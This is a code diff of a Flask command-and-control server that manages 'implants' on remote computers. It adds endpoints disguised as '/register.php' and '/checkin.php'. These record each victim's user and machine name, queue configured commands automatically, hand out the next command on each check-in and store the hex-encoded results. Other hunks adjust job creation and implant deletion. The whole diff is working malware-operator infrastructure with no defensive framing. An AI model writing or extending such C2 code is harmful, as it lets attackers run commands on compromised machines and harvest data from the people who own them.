@@ -138,29 +138,69 @@ def register():
         return Response(status=500, mimetype='application/json')
     return Response(newCommand, status=201, mimetype='text/html; charset=utf-8')
 
-@app.route('/checkin/<guid>', methods=['POST'])
-def checkin(guid):
+@app.route('/register.php', methods=['POST'])
+def registerPHP():
     data = request.form
-    print(data['hex'])
+    hexData = bytes.fromhex(data['hex']).decode("ASCII")
+    dataMap = hexData.split("&")
+    dataDict = {'key': 'value'}
+    for map in dataMap:
+        x = map.split('=')
+        dataDict[x[0]]= x[1]
+    new_instance = Implant(dataDict['guid'], dataDict['user'], dataDict['computer'])
+    try:
+        for command in appConfig["commands"]:
+            job = Job(dataDict['guid'],command)
+            db.session.add(job)
+        db.session.add(new_instance)
+        db.session.commit()
+    except:
+        return Response("OK", status=200, mimetype='text/html; charset=utf-8')
+    return Response("OK", status=200, mimetype='text/html; charset=utf-8')
+
+@app.route('/checkin.php', methods=['POST'])
+def checkinPHP():
+    guid = request.headers.get('Authorization')
+    data = request.form
     decoded = bytes.fromhex(data['hex']).decode("ASCII")
     implant = Implant.query.get_or_404(guid)
     implant.lastSeen = datetime.now()
     currentJobExists = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").scalar() is not None
-    print(currentJobExists)
     if currentJobExists:
         job = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").first()
         job.response = decoded
         job.status = "DONE"
     nextJobExists = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first() is not None
-    print(nextJobExists)
     if nextJobExists:
         nextJob = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first()
         nextJob.status = "STARTED"
     try:
         db.session.commit()
-        jobs = Job.query.all()
-        for job in jobs:
-            print(job.id, job.implantId, job.command, job.status, job.response)
+    except:
+        return Response(status=200, mimetype='application/json')
+    try:
+        nextJob
+        return Response(nextJob.command, status=200, mimetype='text/html; charset=utf-8')
+    except:
+        return Response(status=200, mimetype='text/html; charset=utf-8')
+
+@app.route('/checkin/<guid>', methods=['POST'])
+def checkin(guid):
+    data = request.form
+    decoded = bytes.fromhex(data['hex']).decode("ASCII")
+    implant = Implant.query.get_or_404(guid)
+    implant.lastSeen = datetime.now()
+    currentJobExists = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").scalar() is not None
+    if currentJobExists:
+        job = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").first()
+        job.response = decoded
+        job.status = "DONE"
+    nextJobExists = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first() is not None
+    if nextJobExists:
+        nextJob = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first()
+        nextJob.status = "STARTED"
+    try:
+        db.session.commit()
     except:
         return Response(status=500, mimetype='application/json')
     try:
@@ -180,10 +220,14 @@ def jobs(guid):
 def addJobs(guid):
     command = request.form['command']
     job = Job(guid,command)
-    db.session.add(job)
-    db.session.commit()
-    jobs = Job.query.filter_by(implantId=guid).all()
-    return render_template('details.html', jobs=jobs)
+    try:
+        db.session.add(job)
+        db.session.commit()
+    except:
+        flash('Error creating a job for the implant. Try again.', category='error')
+        return redirect('/')
+    flash('Job added!', category='success')
+    return redirect('/')
 
 @app.route('/delete/<guid>')
 @login_required
@@ -195,9 +239,11 @@ def delete(guid):
             db.session.delete(job)
         db.session.delete(implant)
         db.session.commit()
+        flash('Implant deleted!', category='success')
         return redirect('/')
     except:
-        return Response("Error deleting implant", status=500, mimetype='application/json')
+        flash('Error deleting implant. Try again.', category='error')
+        return redirect('/')
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
